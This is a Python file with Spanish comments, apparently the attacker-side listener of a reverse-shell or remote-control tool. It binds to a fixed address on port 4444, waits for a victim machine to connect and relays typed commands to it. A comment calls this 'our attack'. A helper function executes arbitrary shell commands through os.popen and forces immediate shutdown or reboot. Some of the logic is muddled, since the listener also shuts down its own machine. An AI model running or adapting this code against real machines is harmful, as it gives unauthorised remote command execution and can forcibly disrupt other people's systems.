import socket #Esta librería permite la conexión entre un cliente y un servidor
import os #Esta librería da funciones para poder interactuar con el sistema operativo

def Menu():    #Función de menú visual
    print('//////////////////////////////////////////////')
    print('//////////// MENU DEL CONTROLADOR ////////////')
    print('//////////////////////////////////////////////')
    print('----------------------------------------------')
    print('///////////////// OPCIONES ///////////////////')
    print('----------------------------------------------') 
    print('- ip')
    print('- apagar')
    print('- reiniciar')
    print('- exit')
    print('- dir')
    print('- cd <ruta>')
    print('- mkdir <nombre_carpeta>')
    print('- touch <nombre_archivo>')
    print('----------------------------------------------') 
    print('//////////////////////////////////////////////')
    print('//////////////////////////////////////////////')
    print('//////////////////////////////////////////////')

def ejecutar_comando(command):   #Función para ejecutar los comandos
    if command.lower() == 'ip': #Si el comando es igual a 'ip' muestra la direccion IP
        return f"Dirección IP: {address}"
    elif command.lower() == 'reiniciar': #Si el comando es igual a 'reiniciar' reinicia el equipo controlado
        os.system('shutdown -r -f -t 0')
        return 'Reiniciando...'
    elif command.lower() == 'apagar': #Si el comando es igual a 'apagar' apaga el equipo controlado
        os.system('shutdown -s -f -t 0')
        return 'Apagando...'
    elif command.lower() == 'salir': #Si el comando es igual a 'salir' se corta
        return 'ADIOS'
    elif command.lower().startswith('cd'): #Si el comando es igual a 'cd' + 'ruta' cambia de directorio
        ruta = command.split(' ', 1)[1].strip() #Valor de la ruta
        try:
            os.chdir(ruta)
            return f"Cambiado al directorio: {os.getcwd()}" #Cambiar al directorio e imprimir la ruta
        except Exception as e:
            return str(e)
    elif command.lower().startswith('mkdir'): #Si el comando es igual a 'mkdir' + 'nombre_carpeta' crea una nueva carpeta
        nombrecarpeta = command.split(' ', 1)[1].strip() #Valor de la carpeta o directorio
        try:
            os.mkdir(nombrecarpeta)
            return f"Carpeta creada: {nombrecarpeta}" #Crear carpeta e imprimir
        except Exception as e:
            return str(e)
    elif command.lower().startswith('touch'): #Si el comando es igual a 'touch' + 'nombre_archivo' crea un nuevo archivo de texto
        archivo = command.split(' ', 1)[1].strip() #Valor del archivo
        try:
            with open(archivo, 'w'): #Indicar para crear un archivo tipo txt
                pass
            return f"Archivo {archivo} creado correctamente." #Crear archivo txt
        except Exception as e:
            return str(e)
    else:
        return os.popen(command).read() #Devuelve un valor que ingresemos del S.O

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Crea un socket para la conexión
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Permite reusar el socket para nuestro ataque

listener.bind(('10.7.1.136', 4444)) #Establece los parametros de IP y el puerto
listener.listen(0) #Empieza a escuchar para conectarse

print('Esperando por conexiones')

connection, address = listener.accept() #Acepta la conexión de otro lado

print("Alguien se acaba de conectar OJITO")
Menu()
while True:
    command = input("INGRESE COMANDO>>") #Recibe un comando
    connection.send(command.encode('latin-1')) #Manda un comando en codificación latin-1'
    #Comandos provisionales con la misma función
    if command.lower() == "salir":
        break
    elif command.lower() == "reiniciar":
        connection.send(b'Reiniciando...')
        os.system('shutdown -r -f -t 0')
        break
    elif command.lower() == "apagar":
        connection.send(b'Apagando...')
        os.system('shutdown -s -f -t 0')
        break
    
    result = connection.recv(1024).decode('latin-1') #Recibe el comando y lo ejecuta
    print(result)

connection.close()
